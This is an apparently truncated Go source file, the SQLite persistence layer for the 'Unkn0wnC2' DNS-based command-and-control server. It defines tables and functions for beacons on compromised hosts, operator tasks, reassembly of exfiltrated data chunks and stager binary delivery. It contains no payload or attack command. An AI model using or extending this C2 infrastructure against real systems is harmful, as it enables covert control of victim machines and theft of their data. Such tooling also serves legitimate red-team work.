// Package main implements the database layer for the Unkn0wnC2 Master Server.
// This provides persistent storage for DNS servers, aggregated beacons, tasks,
// results, operators, and audit logging using SQLite.
package main

import (
	"database/sql"
	"encoding/json"
	"fmt"
	"sort"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"golang.org/x/crypto/bcrypt"
	_ "modernc.org/sqlite"
)

const (
	// MasterDatabaseSchemaVersion tracks the current schema version
	MasterDatabaseSchemaVersion = 18

	// MaxTaskCommandLength is the maximum length for task commands.
	// DNS TXT responses are limited to ~512 bytes UDP. After encryption (AES-GCM adds 28 bytes)
	// and Base36 encoding (~1.55x expansion), plus protocol overhead (TASK|taskID|),
	// the practical limit for a single DNS TXT response is ~180 bytes.
	// With chunked delivery, commands up to MaxTaskCommandLength are split across
	// multiple TXT responses of MaxTaskChunkPayload bytes each.
	MaxTaskCommandLength  = 10000
	MaxTaskChunkPayload   = 150
	MaxTaskChunks         = 100
)

// Package-level debug flag for database logging
var dbDebugMode bool

// SetDBDebugMode enables or disables verbose database logging
func SetDBDebugMode(debug bool) {
	dbDebugMode = debug
}

// dbLog logs a message only when debug mode is enabled
func dbLog(format string, args ...interface{}) {
	if dbDebugMode {
		fmt.Printf("[Master DB] "+format+"\n", args...)
	}
}

// dbLogAlways logs a message regardless of debug mode (for errors/important events)
func dbLogAlways(format string, args ...interface{}) {
	fmt.Printf("[Master DB] "+format+"\n", args...)
}

// MasterDatabase wraps the SQL database connection for the master server
type MasterDatabase struct {
	db               *sql.DB
	taskCounter      atomic.Int64
	revokeCache      map[string]revokeCacheEntry
	revokeCacheMutex sync.RWMutex
}

// revokeCacheEntry caches session revocation status with a TTL
type revokeCacheEntry struct {
	isRevoked bool
	expiresAt time.Time
}

// NewMasterDatabase creates a new master database connection and initializes schema
func NewMasterDatabase(dbPath string) (*MasterDatabase, error) {
	if dbPath == "" {
		dbPath = "master.db"
	}

	// Open database connection with per-connection pragmas in the DSN.
	// This ensures every pooled connection gets the same settings.
	dsn := fmt.Sprintf("%s?_pragma=foreign_keys(1)&_pragma=busy_timeout(30000)&_pragma=journal_mode(wal)&_pragma=synchronous(normal)&_pragma=cache_size(-64000)&_pragma=auto_vacuum(incremental)", dbPath)
	db, err := sql.Open("sqlite", dsn)
	if err != nil {
		return nil, fmt.Errorf("failed to open database: %w", err)
	}

	db.SetMaxOpenConns(10)
	db.SetMaxIdleConns(5)
	db.SetConnMaxLifetime(5 * time.Minute)

	database := &MasterDatabase{
		db:          db,
		revokeCache: make(map[string]revokeCacheEntry),
	}

	// Initialize schema
	if err := database.initSchema(); err != nil {
		db.Close()
		return nil, fmt.Errorf("failed to initialize schema: %w", err)
	}

	// Seed taskCounter from existing DB so IDs never collide after a restart.
	// Parses the numeric part of T#### IDs; non-matching rows contribute 0.
	var maxTaskNum int
	database.db.QueryRow(`
		SELECT COALESCE(MAX(CAST(SUBSTR(id, 2) AS INTEGER)), 0)
		FROM tasks
		WHERE id LIKE 'T%' AND LENGTH(id) > 1
	`).Scan(&maxTaskNum)
	database.taskCounter.Store(int64(maxTaskNum))

	dbLogAlways("Database initialized: %s (task counter seeded at %d)\n", dbPath, maxTaskNum)
	return database, nil
}

// Close closes the database connection
func (d *MasterDatabase) Close() error {
	if d.db != nil {
		return d.db.Close()
	}
	return nil
}

// initSchema creates the database schema if it doesn't exist
func (d *MasterDatabase) initSchema() error {
	// CRITICAL: Foreign keys ENABLED for data integrity
	// Note: task_results.dns_server_id FK was specifically removed from schema
	// to allow result storage without DNS server registration (see line 266)
	pragmas := []string{
		"PRAGMA foreign_keys = ON", // Enabled for data integrity (specific FK removed where needed)
		"PRAGMA journal_mode = WAL",
		"PRAGMA synchronous = NORMAL",
		"PRAGMA cache_size = -64000",
		"PRAGMA auto_vacuum = INCREMENTAL",
		"PRAGMA busy_timeout = 30000", // 30 second timeout for busy database (increased from 5s)
	}

	for _, pragma := range pragmas {
		if _, err := d.db.Exec(pragma); err != nil {
			return fmt.Errorf("failed to execute pragma %s: %w", pragma, err)
		}
	}

	// Create schema_version table
	schemaVersionSQL := `
	CREATE TABLE IF NOT EXISTS schema_version (
		version INTEGER PRIMARY KEY,
		applied_at INTEGER NOT NULL,
		description TEXT
	);`

	if _, err := d.db.Exec(schemaVersionSQL); err != nil {
		return fmt.Errorf("failed to create schema_version table: %w", err)
	}

	// Check current version
	var currentVersion int
	err := d.db.QueryRow("SELECT COALESCE(MAX(version), 0) FROM schema_version").Scan(&currentVersion)
	if err != nil {
		return fmt.Errorf("failed to query schema version: %w", err)
	}

	// Apply migrations if needed
	if currentVersion < MasterDatabaseSchemaVersion {
		if err := d.applyMigrations(currentVersion); err != nil {
			return fmt.Errorf("failed to apply migrations: %w", err)
		}
	}

	return nil
}

// applyMigrations applies database schema migrations
func (d *MasterDatabase) applyMigrations(fromVersion int) error {
	dbLogAlways("Applying migrations from version %d to %d\n", fromVersion, MasterDatabaseSchemaVersion)

	// Migration 1: Initial schema
	if fromVersion < 1 {
		if err := d.migration1InitialSchema(); err != nil {
			return fmt.Errorf("migration 1 failed: %w", err)
		}
	}

	// Migration 2: Add UNIQUE constraint to task_results to prevent duplicate chunks
	if fromVersion < 2 {
		if err := d.migration2AddChunkUniqueConstraint(); err != nil {
			return fmt.Errorf("migration 2 failed: %w", err)
		}
	}

	// Migration 3: Add updated_at column to tasks table for status sync
	if fromVersion < 3 {
		if err := d.migration3AddTasksUpdatedAt(); err != nil {
			return fmt.Errorf("migration 3 failed: %w", err)
		}
	}

	// Migration 4: Add jti (JWT ID) column to sessions for token revocation
	if fromVersion < 4 {
		if err := d.migration4AddSessionJTI(); err != nil {
			return fmt.Errorf("migration 4 failed: %w", err)
		}
	}

	// Migration 5: Add sha256_checksum column to client_binaries for signature verification
	if fromVersion < 5 {
		if err := d.migration5AddBinaryChecksum(); err != nil {
			return fmt.Errorf("migration 5 failed: %w", err)
		}
	}

	// Migration 6: Remove FK constraint from beacons.dns_server_id
	if fromVersion < 6 {
		if err := d.migration6RemoveBeaconsFKConstraint(); err != nil {
			return fmt.Errorf("migration 6 failed: %w", err)
		}
	}

	// Migration 7: Track pending task completions when completion signal arrives before data
	if fromVersion < 7 {
		if err := d.migration7AddPendingCompletionTable(); err != nil {
			return fmt.Errorf("migration 7 failed: %w", err)
		}
	}

	if fromVersion < 8 {
		if err := d.migration8AddExfilTables(); err != nil {
			return fmt.Errorf("migration 8 failed: %w", err)
		}
	}

	if fromVersion < 9 {
		if err := d.migration9AddExfilBuildTable(); err != nil {
			return fmt.Errorf("migration 9 failed: %w", err)
		}
	}

	if fromVersion < 10 {
		if err := d.migration10AddExfilBuildJobsTable(); err != nil {
			return fmt.Errorf("migration 10 failed: %w", err)
		}
	}

	if fromVersion < 11 {
		if err := d.migration11AddExfilSessionTags(); err != nil {
			return fmt.Errorf("migration 11 failed: %w", err)
		}
	}

	// Migration 12: Per-DNS-server sync tracking for Shadow Mesh reliability
	if fromVersion < 12 {
		if err := d.migration12AddDNSServerTaskSync(); err != nil {
			return fmt.Errorf("migration 12 failed: %w", err)
		}
	}

	// Migration 13: Index on sessions(jti) for faster revocation lookups
	if fromVersion < 13 {
		if err := d.migration13AddSessionJTIIndex(); err != nil {
			return fmt.Errorf("migration 13 failed: %w", err)
		}
	}

	if fromVersion < 14 {
		if err := d.migration14AddBeaconName(); err != nil {
			return fmt.Errorf("migration 14 failed: %w", err)
		}
	}

	if fromVersion < 15 {
		if err := d.migration15AddBeaconDomains(); err != nil {
			return fmt.Errorf("migration 15 failed: %w", err)
		}
	}

	if fromVersion < 16 {
		if err := d.migration16AddBeaconFormatEncoding(); err != nil {
			return fmt.Errorf("migration 16 failed: %w", err)
		}
	}

	if fromVersion < 17 {
		if err := d.migration17AddBuildIDSupport(); err != nil {
			return fmt.Errorf("migration 17 failed: %w", err)
		}
	}

	if fromVersion < 18 {
		if err := d.migration18AddRegistrationStage(); err != nil {
			return fmt.Errorf("migration 18 failed: %w", err)
		}
	}

	// Record schema version
	_, err := d.db.Exec(`
		INSERT OR REPLACE INTO schema_version (version, applied_at, description)
		VALUES (?, ?, ?)
	`, MasterDatabaseSchemaVersion, time.Now().Unix(), "Master server schema updated")

	return err
}

// migration7AddPendingCompletionTable tracks completion signals that arrive before result data
func (d *MasterDatabase) migration7AddPendingCompletionTable() error {
	_, err := d.db.Exec(`
		CREATE TABLE IF NOT EXISTS pending_task_completions (
			task_id TEXT PRIMARY KEY,
			beacon_id TEXT,
			total_chunks INTEGER NOT NULL,
			created_at INTEGER NOT NULL,
			FOREIGN KEY (task_id) REFERENCES tasks(id) ON DELETE CASCADE
		);

		CREATE INDEX IF NOT EXISTS idx_pending_task_completions_created_at
		ON pending_task_completions(created_at);
	`)

	return err
}

// recordPendingCompletion tracks a completion signal that arrived before result data
func (d *MasterDatabase) recordPendingCompletion(taskID, beaconID string, totalChunks int) {
	if taskID == "" {
		return
	}

	if totalChunks < 0 {
		totalChunks = 0
	}

	_, err := d.db.Exec(`
		INSERT INTO pending_task_completions (task_id, beacon_id, total_chunks, created_at)
		VALUES (?, ?, ?, ?)
		ON CONFLICT(task_id) DO UPDATE SET
			beacon_id = excluded.beacon_id,
			total_chunks = excluded.total_chunks,
			created_at = excluded.created_at
	`, taskID, beaconID, totalChunks, time.Now().Unix())

	if err != nil {
		dbLogAlways("Error recording pending completion for %s: %v\n", taskID, err)
	}
}

// clearPendingCompletion removes any pending completion tracking for a task
func (d *MasterDatabase) clearPendingCompletion(taskID string) {
	if taskID == "" {
		return
	}

	if _, err := d.db.Exec(`DELETE FROM pending_task_completions WHERE task_id = ?`, taskID); err != nil {
		dbLogAlways("Error clearing pending completion for %s: %v\n", taskID, err)
	}
}

// getPendingCompletion retrieves pending completion metadata if it exists
func (d *MasterDatabase) getPendingCompletion(taskID string) (string, int, bool) {
	if taskID == "" {
		return "", 0, false
	}

	var beaconID sql.NullString
	var totalChunks int
	err := d.db.QueryRow(`
		SELECT beacon_id, total_chunks
		FROM pending_task_completions
		WHERE task_id = ?
	`, taskID).Scan(&beaconID, &totalChunks)

	if err == sql.ErrNoRows {
		return "", 0, false
	}
	if err != nil {
		dbLogAlways("Error fetching pending completion for %s: %v\n", taskID, err)
		return "", 0, false
	}

	return beaconID.String, totalChunks, true
}

// MissingChunkRequest represents a request for missing chunks from a DNS server
type MissingChunkRequest struct {
	Type          string `json:"type"`          // "task" or "exfil"
	ID            string `json:"id"`            // task_id or session_id
	Tag           string `json:"tag,omitempty"` // exfil session tag for distributed lookup
	TotalChunks   int    `json:"total_chunks"`
	MissingChunks []int  `json:"missing_chunks"`
}

// GetPendingMissingChunks returns tasks/exfils waiting for missing chunks
// These are sessions where completion was signaled but not all chunks received
func (d *MasterDatabase) GetPendingMissingChunks(maxAge time.Duration) ([]MissingChunkRequest, error) {

	var requests []MissingChunkRequest
	cutoff := time.Now().Add(-maxAge).Unix()

	// Get pending task completions with missing chunks
	taskRows, err := d.db.Query(`
		SELECT ptc.task_id, ptc.total_chunks
		FROM pending_task_completions ptc
		WHERE ptc.created_at > ?
	`, cutoff)
	if err != nil {
		return nil, fmt.Errorf("failed to query pending task completions: %w", err)
	}
	defer taskRows.Close()

	for taskRows.Next() {
		var taskID string
		var totalChunks int
		if err := taskRows.Scan(&taskID, &totalChunks); err != nil {
			continue
		}

		// Get which chunks we have
		missingChunks := d.getMissingTaskChunks(taskID, totalChunks)
		if len(missingChunks) > 0 {
			requests = append(requests, MissingChunkRequest{
				Type:          "task",
				ID:            taskID,
				TotalChunks:   totalChunks,
				MissingChunks: missingChunks,
			})
		}
	}

	// Get pending exfil completions with missing chunks
	exfilRows, err := d.db.Query(`
		SELECT pec.session_id, pec.total_chunks
		FROM pending_exfil_completions pec
		WHERE pec.created_at > ?
	`, cutoff)
	if err != nil {
		return requests, nil // Return task requests even if exfil query fails
	}
	defer exfilRows.Close()

	for exfilRows.Next() {
		var sessionID string
		var totalChunks int
		if err := exfilRows.Scan(&sessionID, &totalChunks); err != nil {
			continue
		}

		// Get which chunks we have for this exfil session
		missingChunks := d.getMissingExfilChunks(sessionID, totalChunks)
		if len(missingChunks) > 0 {
			// Look up the tag for this session for distributed chunk recovery
			var tag string
			d.db.QueryRow(`SELECT tag FROM exfil_session_tags WHERE session_id = ?`, sessionID).Scan(&tag)

			requests = append(requests, MissingChunkRequest{
				Type:          "exfil",
				ID:            sessionID,
				Tag:           tag,
				TotalChunks:   totalChunks,
				MissingChunks: missingChunks,
			})
		}
	}

	return requests, nil
}

// getMissingTaskChunks returns which chunk indices are missing for a task
func (d *MasterDatabase) getMissingTaskChunks(taskID string, totalChunks int) []int {
	// Get all chunk indices we have from task_results (where SaveResultChunk stores them)
	rows, err := d.db.Query(`
		SELECT DISTINCT chunk_index FROM task_results
		WHERE task_id = ? AND chunk_index > 0
		ORDER BY chunk_index
	`, taskID)
	if err != nil {
		return nil
	}
	defer rows.Close()

	haveChunks := make(map[int]bool)
	for rows.Next() {
		var idx int
		if err := rows.Scan(&idx); err == nil {
			haveChunks[idx] = true
		}
	}

	// Find missing chunks (1-indexed)
	var missing []int
	for i := 1; i <= totalChunks; i++ {
		if !haveChunks[i] {
			missing = append(missing, i)
		}
	}

	return missing
}

// getMissingExfilChunks returns which chunk indices are missing for an exfil session
func (d *MasterDatabase) getMissingExfilChunks(sessionID string, totalChunks int) []int {
	// Get all chunk indices we have
	rows, err := d.db.Query(`
		SELECT DISTINCT chunk_index FROM exfil_chunks
		WHERE session_id = ?
		ORDER BY chunk_index
	`, sessionID)
	if err != nil {
		return nil
	}
	defer rows.Close()

	haveChunks := make(map[int]bool)
	maxIdx := 0
	for rows.Next() {
		var idx int
		if err := rows.Scan(&idx); err == nil {
			haveChunks[idx] = true
			if idx > maxIdx {
				maxIdx = idx
			}
		}
	}

	// If totalChunks is 0 but we have a completion signal, infer from max chunk index
	// This handles distributed exfil where metadata went to one DNS server and completion to another
	if totalChunks == 0 && maxIdx > 0 {
		totalChunks = maxIdx
	}

	// Find missing chunks (1-indexed)
	var missing []int
	for i := 1; i <= totalChunks; i++ {
		if !haveChunks[i] {
			missing = append(missing, i)
		}
	}

	return missing
}

// ReceiveMissingChunks processes missing chunks sent by a DNS server
func (d *MasterDatabase) ReceiveMissingChunks(taskID string, chunks map[int][]byte, dnsServerID string) error {

	now := time.Now().Unix()
	for chunkIndex, data := range chunks {
		// Store in task_results (same table as SaveResultChunk uses)
		_, err := d.db.Exec(`
			INSERT OR IGNORE INTO task_results 
			(task_id, beacon_id, dns_server_id, result_data, received_at, chunk_index, total_chunks, is_complete)
			VALUES (?, '', ?, ?, ?, ?, 0, 0)
		`, taskID, dnsServerID, string(data), now, chunkIndex)
		if err != nil {
			return fmt.Errorf("failed to save chunk %d: %w", chunkIndex, err)
		}
	}

	// Check if we now have all chunks and can complete
	_, totalChunks, hasPending := d.getPendingCompletionUnlocked(taskID)
	if hasPending {
		count := 0
		d.db.QueryRow(`SELECT COUNT(DISTINCT chunk_index) FROM task_results WHERE task_id = ? AND chunk_index > 0`, taskID).Scan(&count)
		if count >= totalChunks {
			d.reassembleTaskResultUnlocked(taskID, totalChunks)
			d.clearPendingCompletionUnlocked(taskID)
		}
	}

	return nil
}

// getPendingCompletionUnlocked is the unlocked version for internal use
func (d *MasterDatabase) getPendingCompletionUnlocked(taskID string) (string, int, bool) {
	var beaconID sql.NullString
	var totalChunks int
	err := d.db.QueryRow(`
		SELECT beacon_id, total_chunks
		FROM pending_task_completions
		WHERE task_id = ?
	`, taskID).Scan(&beaconID, &totalChunks)

	if err != nil {
		return "", 0, false
	}
	return beaconID.String, totalChunks, true
}

// clearPendingCompletionUnlocked removes pending completion tracking.
func (d *MasterDatabase) clearPendingCompletionUnlocked(taskID string) {
	d.db.Exec(`DELETE FROM pending_task_completions WHERE task_id = ?`, taskID)
}

// reassembleTaskResultUnlocked attempts to reassemble a task result.
func (d *MasterDatabase) reassembleTaskResultUnlocked(taskID string, totalChunks int) {
	// Get all chunks in order from task_results
	rows, err := d.db.Query(`
		SELECT result_data FROM task_results
		WHERE task_id = ? AND chunk_index > 0
		ORDER BY chunk_index ASC
	`, taskID)
	if err != nil {
		dbLogAlways("Failed to get chunks for reassembly: %v\n", err)
		return
	}
	defer rows.Close()

	var chunks []string
	for rows.Next() {
		var chunk string
		if err := rows.Scan(&chunk); err == nil {
			chunks = append(chunks, chunk)
		}
	}

	if len(chunks) < totalChunks {
		dbLogAlways("Warning: reassembly has %d chunks but expected %d\n", len(chunks), totalChunks)
	}

	// Assemble result
	result := strings.Join(chunks, "")

	// Store assembled result as chunk_index=0 (convention for assembled results)
	now := time.Now().Unix()
	_, err = d.db.Exec(`
		INSERT OR REPLACE INTO task_results (task_id, beacon_id, dns_server_id, result_data, received_at, chunk_index, total_chunks, is_complete)
		VALUES (?, '', 'master-recovered', ?, ?, 0, ?, 1)
	`, taskID, result, now, totalChunks)
	if err != nil {
		dbLogAlways("Failed to store reassembled result: %v\n", err)
		return
	}

	// Update task status
	d.db.Exec(`UPDATE tasks SET status = 'completed', result_size = ?, completed_at = ?, updated_at = ? WHERE id = ?`,
		len(result), now, now, taskID)
	dbLogAlways("Reassembled task %s from recovered chunks (%d bytes)\n", taskID, len(result))
}

// ReceiveMissingExfilChunks processes missing exfil chunks sent by a DNS server
func (d *MasterDatabase) ReceiveMissingExfilChunks(sessionID string, chunks map[int][]byte, dnsServerID string) error {

	for chunkIndex, data := range chunks {
		_, err := d.db.Exec(`
			INSERT OR IGNORE INTO exfil_chunks
			(session_id, chunk_index, data, received_at)
			VALUES (?, ?, ?, ?)
		`, sessionID, chunkIndex, data, time.Now().Unix())
		if err != nil {
			return fmt.Errorf("failed to save exfil chunk %d: %w", chunkIndex, err)
		}
	}

	// Check if we now have all chunks and can complete
	var totalChunks int
	err := d.db.QueryRow(`
		SELECT total_chunks FROM pending_exfil_completions WHERE session_id = ?
	`, sessionID).Scan(&totalChunks)

	if err == nil && totalChunks > 0 {
		var count int
		d.db.QueryRow(`SELECT COUNT(DISTINCT chunk_index) FROM exfil_chunks WHERE session_id = ?`, sessionID).Scan(&count)
		if count >= totalChunks {
			// All chunks received - trigger reassembly via exfil completion
			dbLogAlways("All %d exfil chunks received for session %s from missing chunk recovery\n", totalChunks, sessionID)
			// Clear pending completion - actual assembly happens via normal exfil flow
			d.db.Exec(`DELETE FROM pending_exfil_completions WHERE session_id = ?`, sessionID)
		}
	}

	return nil
}

// migration1InitialSchema creates the initial master database schema
func (d *MasterDatabase) migration1InitialSchema() error {
	schema := `
	-- DNS Servers table
	CREATE TABLE IF NOT EXISTS dns_servers (
		id TEXT PRIMARY KEY,
		domain TEXT NOT NULL UNIQUE,
		address TEXT,
		api_key_hash TEXT NOT NULL,
		status TEXT DEFAULT 'active',
		first_seen INTEGER NOT NULL,
		last_checkin INTEGER NOT NULL,
		beacon_count INTEGER DEFAULT 0,
		task_count INTEGER DEFAULT 0,
		metadata TEXT,
		created_at INTEGER NOT NULL,
		updated_at INTEGER NOT NULL
	);

	CREATE INDEX IF NOT EXISTS idx_dns_servers_domain ON dns_servers(domain);
	CREATE INDEX IF NOT EXISTS idx_dns_servers_status ON dns_servers(status);
	CREATE INDEX IF NOT EXISTS idx_dns_servers_last_checkin ON dns_servers(last_checkin);

	-- Beacons table (aggregated from all DNS servers)
	CREATE TABLE IF NOT EXISTS beacons (
		id TEXT PRIMARY KEY,
		hostname TEXT NOT NULL,
		username TEXT NOT NULL,
		os TEXT NOT NULL,
		arch TEXT NOT NULL,
		ip_address TEXT,
		dns_server_id TEXT NOT NULL,
		first_seen INTEGER NOT NULL,
		last_seen INTEGER NOT NULL,
		status TEXT DEFAULT 'active',
		metadata TEXT,
		created_at INTEGER NOT NULL,
		updated_at INTEGER NOT NULL,
		FOREIGN KEY (dns_server_id) REFERENCES dns_servers(id) ON DELETE CASCADE
	);

	CREATE INDEX IF NOT EXISTS idx_beacons_dns_server ON beacons(dns_server_id);
	CREATE INDEX IF NOT EXISTS idx_beacons_last_seen ON beacons(last_seen);
	CREATE INDEX IF NOT EXISTS idx_beacons_status ON beacons(status);
	CREATE INDEX IF NOT EXISTS idx_beacons_hostname ON beacons(hostname);

	-- Beacon DNS contacts table (track all DNS servers each beacon has contacted)
	CREATE TABLE IF NOT EXISTS beacon_dns_contacts (
		id INTEGER PRIMARY KEY AUTOINCREMENT,
		beacon_id TEXT NOT NULL,
		dns_server_id TEXT NOT NULL,
		dns_domain TEXT NOT NULL,
		first_contact INTEGER NOT NULL,
		last_contact INTEGER NOT NULL,
		contact_count INTEGER DEFAULT 1,
		FOREIGN KEY (beacon_id) REFERENCES beacons(id) ON DELETE CASCADE,
		FOREIGN KEY (dns_server_id) REFERENCES dns_servers(id) ON DELETE CASCADE,
		UNIQUE(beacon_id, dns_server_id)
	);

	CREATE INDEX IF NOT EXISTS idx_beacon_dns_contacts_beacon ON beacon_dns_contacts(beacon_id);
	CREATE INDEX IF NOT EXISTS idx_beacon_dns_contacts_dns_server ON beacon_dns_contacts(dns_server_id);
	CREATE INDEX IF NOT EXISTS idx_beacon_dns_contacts_last_contact ON beacon_dns_contacts(last_contact);

	-- Tasks table (centralized task management)
	CREATE TABLE IF NOT EXISTS tasks (
		id TEXT PRIMARY KEY,
		beacon_id TEXT NOT NULL,
		command TEXT NOT NULL,
		status TEXT NOT NULL DEFAULT 'pending',
		assigned_dns_server TEXT,
		delivered_by_dns_server TEXT,
		created_by TEXT,
		created_at INTEGER NOT NULL,
		sent_at INTEGER,
		completed_at INTEGER,
		updated_at INTEGER NOT NULL,
		synced_at INTEGER,
		result_size INTEGER DEFAULT 0,
		chunk_count INTEGER DEFAULT 0,
		metadata TEXT,
		FOREIGN KEY (beacon_id) REFERENCES beacons(id) ON DELETE CASCADE,
		FOREIGN KEY (assigned_dns_server) REFERENCES dns_servers(id) ON DELETE SET NULL,
		FOREIGN KEY (delivered_by_dns_server) REFERENCES dns_servers(id) ON DELETE SET NULL,
		FOREIGN KEY (created_by) REFERENCES operators(id) ON DELETE SET NULL
	);

	CREATE INDEX IF NOT EXISTS idx_tasks_beacon_id ON tasks(beacon_id);
	CREATE INDEX IF NOT EXISTS idx_tasks_status ON tasks(status);
	CREATE INDEX IF NOT EXISTS idx_tasks_created_at ON tasks(created_at);
	CREATE INDEX IF NOT EXISTS idx_tasks_assigned_dns ON tasks(assigned_dns_server);
	CREATE INDEX IF NOT EXISTS idx_tasks_delivered_by_dns ON tasks(delivered_by_dns_server);
	CREATE INDEX IF NOT EXISTS idx_tasks_created_by ON tasks(created_by);
	CREATE INDEX IF NOT EXISTS idx_tasks_status_created ON tasks(status, created_at DESC);
	CREATE INDEX IF NOT EXISTS idx_tasks_sync ON tasks(status, synced_at, completed_at);

	-- Task results table (aggregated from DNS servers)
	CREATE TABLE IF NOT EXISTS task_results (
		id INTEGER PRIMARY KEY AUTOINCREMENT,
		task_id TEXT NOT NULL,
		beacon_id TEXT NOT NULL,
		dns_server_id TEXT NOT NULL,
		result_data TEXT NOT NULL,
		received_at INTEGER NOT NULL,
		chunk_index INTEGER DEFAULT 0,
		total_chunks INTEGER DEFAULT 1,
		is_complete INTEGER DEFAULT 1,
		FOREIGN KEY (task_id) REFERENCES tasks(id) ON DELETE CASCADE,
		FOREIGN KEY (beacon_id) REFERENCES beacons(id) ON DELETE CASCADE,
		-- REMOVED: FOREIGN KEY (dns_server_id) REFERENCES dns_servers(id) ON DELETE CASCADE
		-- dns_server_id is metadata only, should not block result storage
		UNIQUE(task_id, chunk_index)
	);

	CREATE INDEX IF NOT EXISTS idx_task_results_task_id ON task_results(task_id);
	CREATE INDEX IF NOT EXISTS idx_task_results_beacon_id ON task_results(beacon_id);
	CREATE INDEX IF NOT EXISTS idx_task_results_dns_server ON task_results(dns_server_id);
	CREATE INDEX IF NOT EXISTS idx_task_results_received_at ON task_results(received_at);

	-- Task progress table (track real-time progress from DNS servers)
	CREATE TABLE IF NOT EXISTS task_progress (
		id INTEGER PRIMARY KEY AUTOINCREMENT,
		task_id TEXT NOT NULL,
		beacon_id TEXT NOT NULL,
		dns_server_id TEXT NOT NULL,
		received_chunks INTEGER NOT NULL DEFAULT 0,
		total_chunks INTEGER NOT NULL DEFAULT 1,
		status TEXT NOT NULL DEFAULT 'pending',
		last_updated INTEGER NOT NULL,
		FOREIGN KEY (task_id) REFERENCES tasks(id) ON DELETE CASCADE,
		FOREIGN KEY (beacon_id) REFERENCES beacons(id) ON DELETE CASCADE,
		FOREIGN KEY (dns_server_id) REFERENCES dns_servers(id) ON DELETE CASCADE,
		UNIQUE(task_id, dns_server_id)
	);

	CREATE INDEX IF NOT EXISTS idx_task_progress_task_id ON task_progress(task_id);
	CREATE INDEX IF NOT EXISTS idx_task_progress_status ON task_progress(status);

	-- Domain updates table (track domain changes that need to be pushed to beacons)
	CREATE TABLE IF NOT EXISTS domain_updates (
		id INTEGER PRIMARY KEY AUTOINCREMENT,
		dns_server_id TEXT NOT NULL,
		domain_list TEXT NOT NULL,
		created_at INTEGER NOT NULL,
		delivered INTEGER DEFAULT 0,
		FOREIGN KEY (dns_server_id) REFERENCES dns_servers(id) ON DELETE CASCADE
	);

	CREATE INDEX IF NOT EXISTS idx_domain_updates_dns_server ON domain_updates(dns_server_id);
	CREATE INDEX IF NOT EXISTS idx_domain_updates_delivered ON domain_updates(delivered);

	-- Operators table (multi-user support)
	CREATE TABLE IF NOT EXISTS operators (
		id TEXT PRIMARY KEY,
		username TEXT UNIQUE NOT NULL,
		password_hash TEXT NOT NULL,
		role TEXT NOT NULL DEFAULT 'operator',
		email TEXT,
		created_at INTEGER NOT NULL,
		last_login INTEGER,
		login_count INTEGER DEFAULT 0,
		is_active INTEGER DEFAULT 1,
		metadata TEXT
	);

	CREATE INDEX IF NOT EXISTS idx_operators_username ON operators(username);
	CREATE INDEX IF NOT EXISTS idx_operators_role ON operators(role);
	CREATE INDEX IF NOT EXISTS idx_operators_is_active ON operators(is_active);

	-- Audit log table (track all operator actions)
	CREATE TABLE IF NOT EXISTS audit_log (
		id INTEGER PRIMARY KEY AUTOINCREMENT,
		operator_id TEXT,
		action TEXT NOT NULL,
		target_type TEXT,
		target_id TEXT,
		details TEXT,
		ip_address TEXT,
		timestamp INTEGER NOT NULL,
		FOREIGN KEY (operator_id) REFERENCES operators(id) ON DELETE SET NULL
	);

	CREATE INDEX IF NOT EXISTS idx_audit_log_operator ON audit_log(operator_id);
	CREATE INDEX IF NOT EXISTS idx_audit_log_action ON audit_log(action);
	CREATE INDEX IF NOT EXISTS idx_audit_log_timestamp ON audit_log(timestamp);
	CREATE INDEX IF NOT EXISTS idx_audit_log_target ON audit_log(target_type, target_id);

	-- Client binaries table (pre-built and chunked binaries for stagers)
	CREATE TABLE IF NOT EXISTS client_binaries (
		id TEXT PRIMARY KEY,
		filename TEXT NOT NULL,
		os TEXT NOT NULL,
		arch TEXT NOT NULL,
		version TEXT,
		original_size INTEGER NOT NULL,
		compressed_size INTEGER NOT NULL,
		base64_size INTEGER NOT NULL,
		chunk_size INTEGER NOT NULL DEFAULT 370,
		total_chunks INTEGER NOT NULL,
		base64_data TEXT NOT NULL,
		dns_domains TEXT NOT NULL,
		created_at INTEGER NOT NULL,
		created_by TEXT,
		FOREIGN KEY (created_by) REFERENCES operators(id) ON DELETE SET NULL
	);

	CREATE INDEX IF NOT EXISTS idx_client_binaries_os_arch ON client_binaries(os, arch);
	CREATE INDEX IF NOT EXISTS idx_client_binaries_created_at ON client_binaries(created_at);

	-- Stager sessions table (track stager deployments across DNS servers)
	CREATE TABLE IF NOT EXISTS stager_sessions (
		id TEXT PRIMARY KEY,
		stager_ip TEXT NOT NULL,
		os TEXT NOT NULL,
		arch TEXT NOT NULL,
		client_binary_id TEXT NOT NULL,
		total_chunks INTEGER NOT NULL,
		chunks_delivered INTEGER DEFAULT 0,
		initiated_by_dns TEXT,
		created_at INTEGER NOT NULL,
		last_activity INTEGER NOT NULL,
		completed INTEGER DEFAULT 0,
		completed_at INTEGER,
		FOREIGN KEY (client_binary_id) REFERENCES client_binaries(id) ON DELETE CASCADE,
		FOREIGN KEY (initiated_by_dns) REFERENCES dns_servers(id) ON DELETE SET NULL
	);

	CREATE INDEX IF NOT EXISTS idx_stager_sessions_stager_ip ON stager_sessions(stager_ip);
	CREATE INDEX IF NOT EXISTS idx_stager_sessions_client_binary ON stager_sessions(client_binary_id);
	CREATE INDEX IF NOT EXISTS idx_stager_sessions_created_at ON stager_sessions(created_at);
	CREATE INDEX IF NOT EXISTS idx_stager_sessions_completed ON stager_sessions(completed);

	-- Stager chunk assignments table (which DNS server serves which chunk)
	CREATE TABLE IF NOT EXISTS stager_chunk_assignments (
		session_id TEXT NOT NULL,
		chunk_index INTEGER NOT NULL,
		dns_server_id TEXT NOT NULL,
		chunk_data TEXT NOT NULL,
		delivered INTEGER DEFAULT 0,
		delivered_at INTEGER,
		PRIMARY KEY (session_id, chunk_index),
		FOREIGN KEY (session_id) REFERENCES stager_sessions(id) ON DELETE CASCADE,
		FOREIGN KEY (dns_server_id) REFERENCES dns_servers(id) ON DELETE CASCADE
	);

	CREATE INDEX IF NOT EXISTS idx_stager_chunks_session ON stager_chunk_assignments(session_id);
	CREATE INDEX IF NOT EXISTS idx_stager_chunks_dns_server ON stager_chunk_assignments(dns_server_id);
	CREATE INDEX IF NOT EXISTS idx_stager_chunks_delivered ON stager_chunk_assignments(delivered);

	-- Pending stager cache tasks (sent to DNS servers on next checkin)
	CREATE TABLE IF NOT EXISTS pending_stager_caches (
		id INTEGER PRIMARY KEY AUTOINCREMENT,
		dns_server_id TEXT NOT NULL,
		client_binary_id TEXT NOT NULL,
		created_at INTEGER NOT NULL,
		delivered INTEGER DEFAULT 0,
